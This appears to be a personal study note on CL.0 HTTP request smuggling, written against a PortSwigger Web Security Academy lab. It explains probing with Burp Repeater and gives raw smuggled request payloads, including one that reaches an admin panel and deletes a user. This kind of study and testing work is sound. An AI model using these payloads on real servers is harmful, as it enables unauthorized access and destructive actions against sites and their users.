## CL.0 vulnerabilities

Back-end servers can sometimes be persuaded to ignore the Content-Length header, which effectively means they ignore the body of incoming requests. This paves the way for request smuggling attacks that don't rely on chunked transfer encoding or [HTTP/2 downgrading](HTTP-2%20downgrading.md).

To probe for CL.0 vulnerabilities, first send a request containing another partial request in its body, then send a normal follow-up request. You can then check to see whether the response to the follow-up request was affected by the smuggled prefix.

>[!question]- How to test it with Burpsuite?
>To try this yourself using Burp Repeater:
>1.  Create one tab containing the setup request and another containing an arbitrary follow-up request.
>2.  Add the two tabs to a group in the correct order.
>3.  Using the drop-down menu next to the **Send** button, change the send mode to **Send group in sequence (single connection)**.
>4.  **Change the `Connection` header to `keep-alive`.**
>5.  Send the sequence and check the responses.

Sample request:
```http
POST /vulnerable-endpoint HTTP/1.1                       # HTTP/1.1 200 OK
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x
```

Resulting request in the server queue:
```http
POST /vulnerable-endpoint HTTP/1.1                       # HTTP/1.1 200 OK
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/1.1                                     # 

--- SERVER RESPONSE ---

HTTP/1.1 404 Not Found (!!!)
Host: vulnerable-website.com
```

In the example above, the follow-up request for the home page has received a 404 response. This strongly suggests that the back-end server interpreted the body of the `POST` request (`GET /hopefully404...`) as the start of another request.

>[!tip]
>In the wild, we've mostly observed this behavior on endpoints that simply aren't expecting `POST` requests, so they implicitly assume that no requests have a body. Endpoints that trigger server-level redirects and requests for static files are prime candidates.

# Exploiting CL.0 & H2.0 vulnerabilities

You can exploit CL.0 vulnerabilities for the same vulnerabilities listed on [Exploiting HTTP & HTTP/2 Request Smuggling](HTTP%20Request%20Smuggling.md#Exploiting%20HTTP%20&%20HTTP/2%20Request%20Smuggling)

Non vulnerable request:
```http
POST / HTTP/2
Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: keep-alive

GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/2
Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK
```

Vulnerable request:
```http
POST / HTTP/2
Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: keep-alive

GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/2
Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 404 Not Found
```

Accessed `/admin` page and deleted carlos user (`/admin` was leaked in the same way):
```http
POST / HTTP/2
Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: keep-alive

GET /admin/delete?username=carlos HTTP/1.1
Foo: xGET / HTTP/2
Host: 0aee00c704e3b3f881c98a740074008c.web-security-academy.net     # HTTP/2 200 OK with /admin information
```

# Examples

- [From Akamai to F5 to NTLM... With Love.](../../Readwise/Articles/Malicious%20Group%20-%20From%20Akamai%20to%20F5%20to%20NTLM...%20With%20Love..md)
- https://portswigger.net/web-security/request-smuggling/browser/cl-0